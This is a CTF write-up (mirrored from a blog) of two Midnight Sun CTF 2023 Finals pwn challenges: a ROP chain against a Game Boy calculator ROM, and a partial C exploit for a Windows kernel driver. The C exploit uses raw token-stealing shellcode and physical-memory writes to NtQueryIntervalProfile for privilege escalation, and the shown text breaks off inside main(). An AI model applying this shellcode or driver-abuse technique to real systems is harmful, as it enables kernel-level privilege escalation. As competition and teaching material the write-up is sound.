---
title: Midnight Sun CTF 2023 Finals - Writeups
url: https://buaq.net/go-175475.html
source: unSafe.sh - 不安全
date: 2023-08-27
fetch_date: 2025-10-04T11:58:56.082643
---

# Midnight Sun CTF 2023 Finals - Writeups

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/c9686386fb200e8c276f9e5d398efb99.jpg)

Midnight Sun CTF 2023 Finals - Writeups

The Finals of Midn
*2023-8-26 19:15:8
Author: [ptr-yudai.hatenablog.com(查看原文)](/jump-175475.htm)
阅读量:26
收藏*

---

The Finals of Midnight Sun CTF 2023 was held in August 19th and 20th in Stockholm, Sweden.
I played the CTF as a member of TokyoWesterns and we stood 2nd place.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230826/20230826201916.png)

The final scoreboard

Midnight Sun this year had both CTF and conference.

The [hotel](https://d.hatena.ne.jp/keyword/hotel) and venue this year was great. Both were very close to the station :+1:

The challenge files and my solvers are available here:

[bitbucket.org](https://bitbucket.org/ptr-yudai/writeups-2023/src/master/Midnight_Sun_CTF_Finals/)

## [Pwn] guessboy

Guessboy is a [gameboy](https://d.hatena.ne.jp/keyword/gameboy) pwn challenge.
We're distributed a [gameboy](https://d.hatena.ne.jp/keyword/gameboy) ROM file. Once we solve the challenge, we need to call the organizer to get the physical [gameboy](https://d.hatena.ne.jp/keyword/gameboy) which contains the real flag.

The game is not actually a game, but looks like a calculator:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230822/20230822114143.png)

Calculator working on [Gameboy](https://d.hatena.ne.jp/keyword/Gameboy)

Actually I saw a similar challenge in [Midnight Sun CTF 2019 Finals](https://ptr-yudai.hatenablog.com/entry/2019/06/17/054006), which I couldn't solve at the time. According to the challenge author, however, the exploit of the challenge is different this time.

Still, I remembered the [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) was stack buffer overflow. The same bug exists in this challenge.

The result of a calculation is pushed to the stack. If we hit the equals (=) key, the result is pushed to the stack and the stack top increments (decrements in the memory stack). Since there is no limit on the stack top, we can easily overflow the buffer.
However, you will get a crash message if you randomly overflow the buffer.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230822/20230822115408.png)

Stack smashing protection

So, there is a stack canary. The stack canary is a fixed [value](https://d.hatena.ne.jp/keyword/value) and you can analyse the ROM to get the correct [value](https://d.hatena.ne.jp/keyword/value): 0x5858. This [value](https://d.hatena.ne.jp/keyword/value) is also the same as that of 2019.

The pwn part is over. The remaining part is reversing. Since we don't know where is the flag, we don't know what to do.
[@n4nu](https://twitter.com/_n4nu_) reversed the binary and guessed that:

* There is a function that draws a scrambled flag on the display.
* The flag image exists in tiles.
* The flag is scrambled because of a wrong argument passed to the draw function.

We had to load the tiles and draw it with a right parameter. Here is the ROP chain to accomplish it:

```
22616 = = = = = = = = = C ; stack canary (0x5858)
20450 = C ; func1 (0x4fe2)
10596 = C ; skip  (0x2964)
65280 = C ; arg1  (0xff00)
7330 = C  ; arg2  (0x1ca2)
20699 = C ; func2 (0x50db)
464 = C   ; loop  (0x1d0)
0 = C     ; arg1  (0x0)
4628 = C  ; arg2  (0x1214)
6970 = Q  ; arg3  (0x1b3a)
```

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230822/20230822120705.png)

## [Pwn] HFSAntiCheat

A [vagrant](https://d.hatena.ne.jp/keyword/vagrant) environment, [Windows](https://d.hatena.ne.jp/keyword/Windows) kernel driver, and client to submit the exploit are given.
It was the first time to solve [Windows](https://d.hatena.ne.jp/keyword/Windows) kernel challenge in a CTF.
I leaned a lot but also wasted a lot of time because of the different behavior between [vagrant](https://d.hatena.ne.jp/keyword/vagrant) and my virtual box :cry:

While I was absent for 1v1pwn, [@n4nu](https://twitter.com/_n4nu_) finished analysing the binary.
The driver registers a device and a notifier routine for process creation.

When a process is created with its name set to "CHEAT", the driver checks if the PE imports some blacklisted [Windows](https://d.hatena.ne.jp/keyword/Windows) APIs.
However, this routine was not related to the exploit at all.

The important feature is the device I/O control.
The driver accepts two requests that directly reads from and writes to the physical memory.
We have full control over the entire physical memory.

My first idea was:

1. Leak the base address of `ntoskrnl.exe`.
2. Read the pointer at `HalDispatchTable+0x8`, which points to `NtQueryIntervalProfile`.
3. Overwrite the machine code of `NtQueryIntervalProfile` with our shellcode.
4. Call `NtQueryIntervalProfile` to escalate privilege.

It worked fine on my [VirtualBox](https://d.hatena.ne.jp/keyword/VirtualBox) environment. However, it didn't work on the distributed [vagrant](https://d.hatena.ne.jp/keyword/vagrant) environment.
I wrote "virtual to physical" address converter but it didn't work well on [vagrant](https://d.hatena.ne.jp/keyword/vagrant).
If anyone is familiar with page table, please check [my exploit](https://bitbucket.org/ptr-yudai/writeups-2023/src/master/Midnight_Sun_CTF_Finals/hfsanticheat/solution/vbox_exploit.c) and tell me what is wrong.

Eventually I couldn't fix the bug, and I changed the exploit 1h before the end of the CTF:

1. Search memory for the machine code of `NtQueryIntervalProfile`.
2. Overwrite the machine code with our shellcode.
3. Call `NtQueryIntervalProfile` to escalate privilege.

I avoided searching memory because there was a 5-second time limit, and it is not usually stable.
However, this is CTF. Faster solve is better than a beautiful exploit.

```
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

typedef NTSTATUS (__stdcall *_NtQueryIntervalProfile)(ULONG ProfileSource, PULONG Interval);

#define DRIVER_PATH "\\\\.\\HFSAntiCheat"
#define CMD_READ  0x220004
#define CMD_WRITE 0x220008

const char shellcode[] = "\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x48\x8b\x80\xb8\x00\x00\x00\x49\x89\xc0\x4d\x8b\x80\x48\x04\x00\x00\x49\x81\xe8\x48\x04\x00\x00\x41\x83\xb8\x40\x04\x00\x00\x04\x75\xe8\x49\x8b\x88\xb8\x04\x00\x00\x80\xe1\xf0\x48\x8b\x90\xb8\x04\x00\x00\x48\x83\xe2\x07\x48\x01\xd1\x48\x89\x88\xb8\x04\x00\x00\x31\xc0\xc3";

typedef struct {
    size_t size;
    void* buffer;
    void* address;
} RWRequest;

HANDLE hDevice;

void *memmem(const void *haystack, size_t haystack_len,
             const void * const needle, const size_t needle_len) {
  for (const char *h = haystack;
       haystack_len >= needle_len;
       ++h, --haystack_len) {
    if (!memcmp(h, needle, needle_len))
      return (void*)h;
  }
  return NULL;
}

int pm_read(void *dst, void* src, size_t size) {
    BOOL res;
    RWRequest req;
    DWORD s;
    req.size = size;
    req.buffer = dst;
    req.address = src;
    res = DeviceIoControl(hDevice, CMD_READ, &req, sizeof(req), NULL, 0, &s, (LPOVERLAPPED)NULL);
    if (!res) puts("[-] pm_read failed");
    return res;
}

int pm_write(void* dst, void* src, size_t size) {
    BOOL res;
    RWRequest req;
    DWORD s;
    req.size = size;
    req.buffer = src;
    req.address = dst;
    res = DeviceIoControl(hDevice, CMD_WRITE, &req, sizeof(req), NULL, 0, &s, (LPOVERLAPPED)NULL);
    if (!res) puts("[-] pm_write failed");
    return res;
}

int main(int argc, CHAR *argv[]) {
    unsigned long long  buf[0x200];
    DWORD size;
  _NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)
    GetProcAddress(GetModuleHandle("ntdll.dll"), "...